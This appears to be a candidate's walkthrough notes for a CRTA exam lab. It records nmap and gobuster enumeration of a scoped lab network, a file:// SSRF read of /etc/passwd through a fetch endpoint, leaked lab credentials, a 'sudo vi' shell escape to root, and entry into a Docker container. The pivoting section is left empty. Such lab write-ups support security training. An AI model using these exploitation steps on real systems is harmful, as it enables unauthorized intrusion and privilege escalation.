---
hidden: true
---

# CRTA Exam

## Information

Initial Access SCOPE of Engagement:\
**172.26.10.0/24 \[ONLY 172.26.10.1 is out of scope]**\
Please note that you may discover additional internal networks, use that in scope sticking to the objective i.e to retrieve the "secret.xml" file.

## Host Discovery

```bash
nmap -sn 172.26.10.0/24 -oN hosts_net_1.txt

Nmap scan report for 172.26.10.11
```



## Port Scan Network 1

```bash
nmap -T4 -sV -p- --open -oN port_scan_net_1.txt 172.26.10.11

Nmap scan report for 172.26.10.11
Host is up (0.29s latency).
Not shown: 65531 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
8091/tcp  open  http    Node.js Express framework
23100/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.22)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Web Enumeration

```
http://172.26.10.11:8091/login
```

Dir enumeration

{% code overflow="wrap" %}
```bash
gobuster dir -u http://172.26.10.11:8091/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -b 403,404 --exclude-length 2759
```
{% endcode %}





### Credentials discovery

<figure><img src="../../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

```
http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd

app-admin:x:1000:1000:@dmin@123:/home/app-admin:/bin/bash
```



## Host enumeration

```bash
cat hothost.json 

{
  "users": [
    {
      "id": "07643590-1aea-4de3-91ec-8881600cc54c",
      "username": "admin",
      "password": "665a26fad71ea9ef3edf5f33195d4b31",
      "createdAt": "Mon May 12 2025"
    }
  ],
  "monitoringData": [],
  "httpMonitoringData": [],
  "settings": {
    "RAM_THRESHOLD": 90,
    "RAM_STABILIZATION_LEVEL": 3,
    "DISK_THRESHOLD": 90,
    "DISK_STABILIZATION_LEVEL": 1,
    "HOST_IS_DOWN_CONFIRMATIONS": 1,
    "HTTP_ISSUE_CONFIRMATION": 1,
    "DAYS_FOR_SSL_EXPIRED": 14,
    "HOURS_FOR_NEXT_ALERT": 12
  },
  "pluginSettings": []

```

### Active ports

```
══╣ Active Ports (netstat)                                                                                                                                                                                                                  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      615/systemd-resolve                                                                                                                                         
tcp        0      0 0.0.0.0:8091            0.0.0.0:*               LISTEN      5083/docker-proxy   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      615/systemd-resolve 
tcp        0      0 127.0.0.1:45383         0.0.0.0:*               LISTEN      952/containerd      
tcp        0      0 0.0.0.0:23100           0.0.0.0:*               LISTEN      5215/docker-proxy   
tcp6       0      0 :::8091                 :::*                    LISTEN      5092/docker-proxy   
tcp6       0      0 :::22                   :::*                    LISTEN      1/init              
tcp6       0      0 :::23100                :::*                    LISTEN      5221/docker-proxy  
```



### Web page directory

```
/root/hot

/root/hot/server/src
```



### Log File

```
    30229   1404 -rw-r-----   1 syslog   adm       1435515 Jul 19 07:20 /var/log/syslog.1                                                                                                                                                   
     2528    140 -rw-r-----   1 root     adm        142119 May 26 13:32 /var/log/dmesg.0
    27644     28 -rw-r-----   1 root     adm         26301 May  2 11:27 /var/log/dmesg.4.gz
    15985      4 -rw-r-----   1 syslog   adm          2275 May 10 00:34 /var/log/kern.log.4.gz
    36727      8 -rw-r-----   1 syslog   adm          6019 Jul 19 09:22 /var/log/auth.log
    42297      0 -rw-r-----   1 root     adm                    0 May  1 10:31 /var/log/apport.log
    23610      4 -rw-r-----   1 syslog   adm                  861 May 20 07:51 /var/log/auth.log.2.gz
    36700      0 -rw-r-----   1 root     adm                    0 Jul 19 07:20 /var/log/apt/term.log
    36702     28 -rw-r-----   1 root     adm                27468 May 19 10:31 /var/log/apt/term.log.1.gz
    36725      8 -rw-r-----   1 syslog   adm                 7118 Jul 19 09:22 /var/log/kern.log
    15984     80 -rw-r-----   1 syslog   adm                78158 May 11 00:00 /var/log/syslog.4.gz
    30235     40 -rw-r-----   1 syslog   adm                35210 May 31 07:54 /var/log/auth.log.1
    36729      8 -rw-r--r--   1 root     adm                 4487 May 16 06:21 /var/log/unattended-upgrades/unattended-upgrades-dpkg.log.1.gz
    36379      0 -rw-r--r--   1 root     adm                    0 Jul 19 07:20 /var/log/unattended-upgrades/unattended-upgrades-dpkg.log
    30233    360 -rw-r-----   1 syslog   adm               367604 May 31 07:54 /var/log/kern.log.1
    42225     72 -rw-r-----   1 syslog   adm                70973 May  1 10:32 /var/log/cloud-init.log
    26152    140 -rw-r-----   1 root     adm               142296 May 26 13:32 /var/log/dmesg
    23609     48 -rw-r-----   1 syslog   adm                48455 May 26 13:30 /var/log/kern.log.2.gz
    36714    196 -rw-r-----   1 syslog   adm               198496 May 26 13:30 /var/log/syslog.2.gz
    23615    120 -rw-r-----   1 syslog   adm               117214 Jul 19 09:23 /var/log/syslog
    15986     28 -rw-r-----   1 syslog   adm                24873 May 10 23:59 /var/log/auth.log.4.gz
    29169     28 -rw-r-----   1 syslog   adm                28417 May 17 13:35 /var/log/kern.log.3.gz
    25806     28 -rw-r-----   1 root     adm                26379 May 12 07:42 /var/log/dmesg.3.gz
    42229      8 -rw-r-----   1 root     adm                 4100 May  1 10:32 /var/log/cloud-init-output.log
     2526     28 -rw-r-----   1 root     adm                26670 May 19 12:26 /var/log/dmesg.2.gz
    29168    172 -rw-r-----   1 syslog   adm               175386 May 18 00:00 /var/log/syslog.3.gz
    29170     28 -rw-r-----   1 syslog   adm                26373 May 17 23:59 /var/log/auth.log.3.gz
     2519     28 -rw-r-----   1 root     adm                26709 May 20 07:35 /var/log/dmesg.1.gz


```



### Privilege Escalation

```bash
sudo -l

User app-admin may run the following commands on app-server:
    (ALL) /usr/bin/vi

```

```bash
sudo vi -c ':!/bin/sh' /dev/null
```



### Credentials from Linpeass

Web Portal

```
HOTHOST_WEB_ADMIN_PASSWORD=Very3stroungPassword
HOTHOST_WEB_ADMIN_USERNAME=admin
HOTHOST_WEB_PORT=8091
```

### Connection in docker

```
docker ps
docker exec -it hot_1 sh
```



## Pivoting

```
```
